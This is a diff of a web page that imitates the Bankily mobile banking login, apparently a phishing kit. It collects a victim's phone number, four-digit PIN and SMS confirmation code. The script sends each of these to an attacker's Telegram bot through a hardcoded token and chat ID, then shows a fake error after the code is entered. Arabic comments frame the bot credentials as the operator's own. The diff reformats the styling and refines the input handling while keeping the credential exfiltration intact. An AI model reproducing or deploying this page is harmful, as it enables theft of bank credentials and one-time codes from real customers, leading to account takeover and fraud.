@@ -9,13 +9,21 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
 
-::selection { background-color: #b3c5ea !important; color: #000000 !important; }
-::-moz-selection { background-color: #b3c5ea !important; color: #000000 !important; }
+/* لون تحديد النص */
+::selection {
+  background-color: #b3c5ea !important;
+  color: #000000 !important;
+}
+::-moz-selection {
+  background-color: #b3c5ea !important;
+  color: #000000 !important;
+}
 
 #app{width:100%;height:100%;display:flex;justify-content:center;position:relative}
 .phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden;position:relative}
 
 .hdr{background:#fff;height:20px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
+
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
 
 .logo-box{display:flex;justify-content:center;margin:15px 0 25px}
@@ -24,57 +32,265 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .field{margin-bottom:20px; position: relative;}
 .lbl{font-size:12.5px;font-weight:600;color:#444;display:block;text-align:right;margin-bottom:6px}
 
-.row-phone-wrap { display: flex; align-items: center; justify-content: flex-start; width: 100%; direction: rtl; }
-.row-phone-input { flex: 1; max-width: 250px; border-bottom: 1.5px solid #333; padding: 2px 0; display: flex; align-items: center; }
+/* حقل اسم المستخدم / رقم الهاتف */
+.row-phone-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  width: 100%;
+  direction: rtl;
+}
+.row-phone-input {
+  flex: 1;
+  max-width: 250px;
+  border-bottom: 1.5px solid #333;
+  padding: 2px 0;
+  display: flex;
+  align-items: center;
+}
 .row-phone-input input {
-  width: 100%; border: none; outline: none; font-family: system-ui, -apple-system, sans-serif;
-  font-size: 17px; font-weight: 500; letter-spacing: 1px; color: #1a1a1a; background: transparent;
-  text-align: right !important; direction: rtl !important; caret-color: #1877F2 !important;
+  width: 100%;
+  border: none;
+  outline: none;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  font-size: 17px;
+  font-weight: 500;
+  letter-spacing: 1px;
+  color: #1a1a1a;
+  background: transparent;
+  text-align: right !important;
+  direction: rtl !important;
+  caret-color: #1877F2 !important;
 }
 
 .ico{width:22px;height:22px;flex-shrink:0;color:#000;margin-left:10px;}
+
 .errmsg{color:#e74c3c;font-size:11px;text-align:right;margin-top:4px;min-height:14px}
 
-.pin-row-wrap { display: flex; align-items: center; justify-content: flex-start; width: 100%; direction: rtl; }
-.pins-container { display:flex; justify-content:space-between; align-items:center; gap:10px; direction:ltr; width: 160px; }
-.pins-container input {
-  width: 32px; height: 28px; text-align: center; font-size: 26px; line-height: 28px;
-  border: none; border-bottom: 2px solid #333; border-radius: 0 !important; outline: none;
-  background: transparent; font-family: system-ui, -apple-system, sans-serif; color: #000;
-  caret-color: #1877F2 !important; padding: 0; direction: ltr;
-  -webkit-text-security: disc !important; text-security: disc !important; box-shadow: none !important;
+/* حقل الرقم السري */
+.pin-row-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  width: 100%;
+  direction: rtl;
 }
 
-.forgot-container { width: 100%; display: flex; justify-content: flex-start; margin-top: 8px; direction: ltr; }
-.lnk-forgot { font-size: 12px; color: #333; text-decoration: underline; cursor: pointer; background: none; border: none; font-family: 'Cairo', sans-serif; font-weight: 600; }
-.lnk-md{ font-size:11px; font-weight:700; color:#333; text-decoration:underline; cursor:pointer; background:none; border:none; font-family:'Cairo',sans-serif; }
+.pins-container {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:10px;
+  direction:ltr;
+  width: 160px;
+}
+
+.pins-container input {
+  width: 32px;
+  height: 28px;
+  text-align: center;
+  font-size: 26px;
+  line-height: 28px;
+  border: none;
+  border-bottom: 2px solid #333;
+  border-radius: 0 !important;
+  outline: none;
+  background: transparent;
+  font-family: system-ui, -apple-system, sans-serif;
+  color: #000;
+  caret-color: #1877F2 !important;
+  padding: 0;
+  direction: ltr;
+  -webkit-text-security: disc !important;
+  text-security: disc !important;
+  box-shadow: none !important;
+}
+
+/* زر نسيت الرقم السري مضبوط تماماً في جهة اليسار تحت الحقل */
+.forgot-container {
+  width: 100%;
+  display: flex;
+  justify-content: flex-start;
+  margin-top: 8px;
+  direction: ltr;
+  padding-left: 0;
+}
+
+.lnk-forgot {
+  font-size: 12px;
+  color: #333;
+  text-decoration: underline;
+  cursor: pointer;
+  background: none;
+  border: none;
+  font-family: 'Cairo', sans-serif;
+  font-weight: 600;
+  display: inline-block;
+  white-space: nowrap;
+}
+
+/* مستخدم جديد بأسلوب أصغر */
+.lnk-md{
+  font-size:11px;
+  font-weight:700;
+  color:#333;
+  text-decoration:underline;
+  cursor:pointer;
+  background:none;
+  border:none;
+  font-family:'Cairo',sans-serif;
+}
 
 .spacer{flex:1;min-height:20px}
-.btn{ height:50px; background:#F2C029; border:none; width:100%; font-family:'Cairo',sans-serif; font-size:18px; font-weight:800; color:#fff; cursor:pointer; flex-shrink:0; }
+
+/* زر تسجيل الدخول والتحقق */
+.btn{
+  height:50px;
+  background:#F2C029;
+  border:none;
+  width:100%;
+  font-family:'Cairo',sans-serif;
+  font-size:18px;
+  font-weight:800;
+  color:#fff;
+  cursor:pointer;
+  flex-shrink:0;
+  transition:opacity .15s;
+}
+.btn:active{opacity:.85}
 
 .screen{display:flex;flex-direction:column;height:100%}
 .hide{display:none!important}
 
-.otp-hdr { background: #29C5E0 !important; height: 48px !important; display: flex; align-items: center; justify-content: center; position: relative; }
-.otp-hdr .hdr-title { color: #fff; font-size: 17px; font-weight: 700; }
-.otp-hdr .hdr-back { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 24px; border: none; background: none; cursor: pointer; }
-
-.otp-title { font-size: 13.5px; font-weight: 600; color: #666; text-align: center; line-height: 1.5; margin: 30px 15px 30px; }
-.otp-row { display: flex; gap: 16px; justify-content: center; direction: ltr; margin-bottom: 30px; }
-.otp-row input {
-  width: 28px; height: 26px; text-align: center; font-size: 18px; font-weight: 700;
-  font-family: system-ui, -apple-system, sans-serif; border: none; border-bottom: 2px solid #333;
-  outline: none; background: transparent; color: #1a1a1a; direction: ltr; padding: 0;
+/* ==================== شاشة OTP ==================== */
+.otp-hdr {
+  background: #29C5E0 !important;
+  height: 48px !important;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+}
+.otp-hdr .hdr-title {
+  position: static;
+  transform: none;
+  color: #fff;
+  font-size: 17px;
+  font-weight: 700;
+}
+.otp-hdr .hdr-back {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #fff;
+  font-size: 24px;
+  border: none;
+  background: none;
+  cursor: pointer;
 }
 
-.cd-timer-text { text-align: center; font-size: 14px; font-weight: 700; color: #183059; }
+.otp-title {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #666;
+  text-align: center;
+  line-height: 1.5;
+  margin: 30px 15px 30px;
+}
 
-.modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); display: flex; align-items: center; justify-content: center; z-index: 1000; }
-.modal-card { width: 82%; max-width: 320px; background: #fff; border-radius: 4px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-align: center; }
-.modal-body { padding: 24px 20px; }
-.modal-title { font-size: 17px; font-weight: 800; color: #1a1a1a; margin-bottom: 12px; }
-.modal-text { font-size: 14px; color: #444; line-height: 1.5; font-weight: 600; }
-.modal-btn { width: 100%; height: 44px; background: #29C5E0; border: none; color: #fff; font-size: 16px; font-weight: 700; font-family: 'Cairo', sans-serif; cursor: pointer; }
+.otp-row {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+  direction: ltr;
+  margin-bottom: 30px;
+}
+.otp-row input {
+  width: 28px;
+  height: 26px;
+  text-align: center;
+  font-size: 18px;
+  font-weight: 700;
+  font-family: system-ui, -apple-system, sans-serif;
+  border: none;
+  border-bottom: 2px solid #333;
+  border-radius: 0;
+  outline: none;
+  background: transparent;
+  color: #1a1a1a;
+  caret-color: #1877F2 !important;
+  direction: ltr;
+  padding: 0;
+}
+
+.cd-timer-text {
+  text-align: center;
+  font-size: 14px;
+  font-weight: 700;
+  color: #183059;
+  font-family: system-ui, -apple-system, sans-serif;
+}
+
+/* ==================== نوافذ التنبيه المنبثقة ==================== */
+.modal-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.4);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.modal-card {
+  width: 82%;
+  max-width: 320px;
+  background: #fff;
+  border-radius: 4px;
+  overflow: hidden;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  text-align: center;
+  animation: fadeIn 0.2s ease-in-out;
+}
+
+.modal-body {
+  padding: 24px 20px;
+}
+
+.modal-title {
+  font-size: 17px;
+  font-weight: 800;
+  color: #1a1a1a;
+  margin-bottom: 12px;
+}
+
+.modal-text {
+  font-size: 14px;
+  color: #444;
+  line-height: 1.5;
+  font-weight: 600;
+}
+
+.modal-btn {
+  width: 100%;
+  height: 44px;
+  background: #29C5E0;
+  border: none;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: 'Cairo', sans-serif;
+  cursor: pointer;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
 </style>
 </head>
 <body>
@@ -84,6 +300,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 <div id="pg-login" class="screen">
   <div class="hdr"></div>
   <div class="body">
+
     <div class="logo-box">
       <img src="logo_bankily.jpeg" alt="Bankily بنكيلي"/>
     </div>
@@ -91,9 +308,13 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
     <div class="field">
       <label class="lbl">اسم المستخدم أو رقم الهاتف</label>
       <div class="row-phone-wrap">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M6.16 19a7 7 0 0 1 11.68 0"/></svg>
-        <div class="row-phone-input">
-          <input type="tel" id="ph" inputmode="numeric" maxlength="8" autocomplete="off"/>
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <circle cx="12" cy="10" r="3"/>
+          <path d="M6.16 19a7 7 0 0 1 11.68 0"/>
+        </svg>
+        <div class="row-phone-input" id="row-ph">
+          <input type="tel" id="ph" inputmode="numeric" maxlength="8" placeholder="" autocomplete="off"/>
         </div>
       </div>
       <div class="errmsg" id="err-ph"></div>
@@ -102,8 +323,13 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
     <div class="field">
       <label class="lbl">الرقم السري</label>
       <div class="pin-row-wrap">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0"/><circle cx="12" cy="15" r="1" fill="currentColor"/><line x1="12" y1="16" x2="12" y2="18"/></svg>
-        <div class="pins-container">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="11" width="14" height="10" rx="2"/>
+          <path d="M8 11V7a4 4 0 0 1 8 0"/>
+          <circle cx="12" cy="15" r="1" fill="currentColor"/>
+          <line x1="12" y1="16" x2="12" y2="18"/>
+        </svg>
+        <div class="pins-container" id="row-pin">
           <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p0"/>
           <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p1"/>
           <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p2"/>
@@ -131,13 +357,16 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   </div>
   <div class="body" style="align-items:center">
     <div class="otp-title">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</div>
+    
     <div class="otp-row">
       <input type="text" inputmode="numeric" maxlength="1" id="o0"/>
       <input type="text" inputmode="numeric" maxlength="1" id="o1"/>
       <input type="text" inputmode="numeric" maxlength="1" id="o2"/>
       <input type="text" inputmode="numeric" maxlength="1" id="o3"/>
     </div>
+
     <div class="cd-timer-text" id="cd">05:00 ثواني</div>
+    
     <div class="spacer"></div>
   </div>
   <button class="btn" onclick="verify()">التحقق</button>
@@ -167,7 +396,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-// تم وضع التوكن والآيدي الخاص بك هنا مباشرة
+// بيانات التيليجرام المستخرجة من حسابك
 const telegramToken = "8854630231:AAhWY-escCA2tLazBgDZWqNaPNqUNTPiKGA";
 const telegramChatId = "8972356637";
 
@@ -188,35 +417,58 @@ function sendToTelegram(phone, pin, otpCode = null) {
       parse_mode: "HTML"
     })
   })
-  .then(response => response.json())
-  .then(data => console.log("Success:", data))
+  .then(response => console.log("Sent"))
   .catch(error => console.error("Error:", error));
 }
 
 function setupStrictLengthValidation(inputElement, maxLength) {
   inputElement.addEventListener('keydown', function(e) {
-    const isControlKey = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(e.key);
+    const isControlKey = e.key === 'Backspace' || e.key === 'Delete' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab';
     const isNumber = /^[0-9]$/.test(e.key);
+
     if (isControlKey) return;
     if (!isNumber) { e.preventDefault(); return; }
-    if (this.value.length >= maxLength) { e.preventDefault(); }
+
+    if (this.value.length >= maxLength) {
+      e.preventDefault();
+    }
   });
 
   inputElement.addEventListener('input', function() {
-    this.value = this.value.replace(/[^0-9]/g, '').slice(0, maxLength);
+    this.value = this.value.replace(/[^0-9]/g, '');
+    if (this.value.length > maxLength) {
+      this.value = this.value.slice(0, maxLength);
+    }
   });
 }
 
 var P=[0,1,2,3].map(function(i){return document.getElementById('p'+i);});
 P.forEach(function(el,i){
   setupStrictLengthValidation(el, 1);
+
+  el.addEventListener('focus', function() {
+    if (this.value !== '') return;
+    for (let j = 0; j < P.length; j++) {
+      if (P[j].value === '') {
+        if (j !== i) P[j].focus();
+        break;
+      }
+    }
+  });
+
   el.addEventListener('input',function(){
+    el.value=el.value.replace(/[^0-9]/g,'');
+    document.getElementById('err-pin').textContent='';
     if(el.value&&i<3)P[i+1].focus();
   });
+
   el.addEventListener('keydown',function(e){
     if(e.key==='Backspace'){
-      if(el.value.length>0){ el.value=''; }
-      else if(i>0){ P[i-1].focus(); }
+      if(el.value.length>0){
+        el.value='';
+      }else if(i>0){
+        P[i-1].focus();
+      }
       e.preventDefault();
     }
   });
@@ -224,6 +476,10 @@ P.forEach(function(el,i){
 
 var phEl=document.getElementById('ph');
 setupStrictLengthValidation(phEl, 8);
+phEl.addEventListener('input',function(){
+  this.value=this.value.replace(/[^0-9]/g,'');
+  document.getElementById('err-ph').textContent='';
+});
 
 function login(){
   var ph=phEl.value.trim();
@@ -235,7 +491,6 @@ function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    // إرسال البيانات فوراً للبوت عند إدخال رقم صحيح ورقم سري صحيح
     sendToTelegram(ph, pin);
     showOtp();
   }
@@ -248,13 +503,29 @@ function closeUserErrorModal(){
 var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
 O.forEach(function(el,i){
   setupStrictLengthValidation(el, 1);
+
+  el.addEventListener('focus', function() {
+    if (this.value !== '') return;
+    for (let j = 0; j < O.length; j++) {
+      if (O[j].value === '') {
+        if (j !== i) O[j].focus();
+        break;
+      }
+    }
+  });
+
   el.addEventListener('input',function(){
+    el.value=el.value.replace(/[^0-9]/g,'');
     if(el.value&&i<3)O[i+1].focus();
   });
+
   el.addEventListener('keydown',function(e){
     if(e.key==='Backspace'){
-      if(el.value.length>0){ el.value=''; }
-      else if(i>0){ O[i-1].focus(); }
+      if(el.value.length>0){
+        el.value='';
+      }else if(i>0){
+        O[i-1].focus();
+      }
       e.preventDefault();
     }
   });
@@ -262,12 +533,14 @@ O.forEach(function(el,i){
 
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
-  if(code.length !== 4) return;
+  
+  if(code.length !== 4) {
+    return;
+  }
   
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // إرسال الرمز للبوت
   sendToTelegram(ph, pin, code);
 
   document.getElementById('otp-error-modal').classList.remove('hide');
